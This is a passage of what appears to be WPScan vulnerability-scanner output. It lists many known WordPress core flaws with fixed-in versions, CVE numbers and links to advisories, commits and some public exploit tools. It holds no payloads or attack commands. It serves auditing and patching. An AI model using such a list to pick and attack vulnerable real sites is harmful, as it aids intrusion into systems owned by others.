 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
 |
 | [!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/c0775703-ed52-4b6b-b395-7bf440ee0d77
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
 |      - https://codex.wordpress.org/Version_4.5
 |
 | [!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 4.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/60556c39-6fe7-4b69-a614-16202ba588ad
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
 |      - https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
 |
 | [!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
 |     Fixed in: 4.2.8
 |     References:
 |      - https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
 |      - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
 |
 | [!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpscan.com/vulnerability/a4395fa3-a2ba-4aac-b195-679112dd2828
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
 |
 | [!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpscan.com/vulnerability/12a47b8e-83e8-47b1-9713-cdd690b069e5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
 |      - https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
 |
 | [!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpscan.com/vulnerability/897d068a-d3c1-4193-bc55-f65225265967
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
 |
 | [!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
 |     Fixed in: 4.2.10
 |     References:
 |      - https://wpscan.com/vulnerability/e84eaf3f-677a-465a-8f96-ea4cf074c980
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
 |      - https://seclists.org/fulldisclosure/2016/Sep/6
 |
 | [!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
 |     Fixed in: 4.2.10
 |     References:
 |      - https://wpscan.com/vulnerability/7dcebd34-1a38-4f61-a116-bf8bf977b169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
 |
 | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/8b098363-1efb-4831-9b53-bb5d9770e8b4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
 |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/6737b4a2-080c-454a-a16e-7fc59824c659
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
 |      - https://www.mehmetince.net/low-severity-wordpress/
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
 |
 | [!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/0a666ddd-a13d-48c2-85c2-bfdc9cd2a5fb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
 |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/e080c934-6a98-4726-8e7a-43a718d05e79
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
 |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/3e355742-6069-4d5d-9676-613df46e8c54
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
 |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
 |     Fixed in: 4.2.12
 |     References:
 |      - https://wpscan.com/vulnerability/c448e613-6714-4ad7-864f-77659b4da893
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
 |
 | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
 |     Fixed in: 4.2.12
 |     References:
 |      - https://wpscan.com/vulnerability/481e3398-ed2e-460a-af67-ff58027901d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
 |
 | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/2c5632d8-4d40-4099-9e8f-23afde51b56e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
 |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
 |      - https://seclists.org/oss-sec/2017/q1/563
 |
 | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/d40374cf-ee95-40b7-9dd5-dbb160b877b1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
 |
 | [!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
 |      - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 |
 | [!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/003d94a5-a075-47e5-a69e-eeaf9b7a3269
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
 |      - https://seclists.org/oss-sec/2017/q1/562
 |      - https://hackerone.com/reports/153093
 |
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpscan.com/vulnerability/b3f2f3db-75e4-4d48-ae5e-d4ff172bc093
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239
 |
 | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/e9e59e08-0586-4332-a394-efb648c7cd84
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
 |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/973c55ed-e120-46a1-8dbb-538b54d03892
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/a5a4f4ca-19e5-4665-b501-5c75e0f56001
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/efe46d58-45e4-4cd6-94b3-1a639865ba5b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
 |
 | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/78ae4791-2703-4fdd-89b2-76c674994acf
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
 |      - https://hackerone.com/reports/203515
 |      - https://hackerone.com/reports/203515
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/e9535a5c-c6dc-4742-be40-1b94a718d3f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
 |
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpscan.com/vulnerability/9b3414c0-b33b-4c55-adff-718ff4c3195d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
 |     Fixed in: 4.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/95e87ae5-eb01-4e27-96d3-b1f013deff1c
 |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://wpvulndb.com/vulnerabilities/8905
 |
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpscan.com/vulnerability/571beae9-d92d-4f9b-aa9f-7c94e33683a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpscan.com/vulnerability/d74ee25a-d845-46b5-afa6-b0a917b7737a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457
 |      - https://hackerone.com/reports/205481
 |
 | [!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
 |     Fixed in: 4.2.17
 |     References:
 |      - https://wpscan.com/vulnerability/c161f0f0-6527-4ba4-a43d-36c644e250fc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
 |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
 |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
 |      - https://twitter.com/ircmaxell/status/923662170092638208
 |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
 |
 | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
 |
 | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpscan.com/vulnerability/1f71a775-e87e-47e9-9642-bf4bce99c332
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
 |
 | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpscan.com/vulnerability/809f68d5-97aa-44e5-b181-cc7bdf5685c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
 |
 | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/6ac45244-9f09-4e9c-92f3-f339d450fe72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/42720
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.2.21
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.23
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.2.24
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
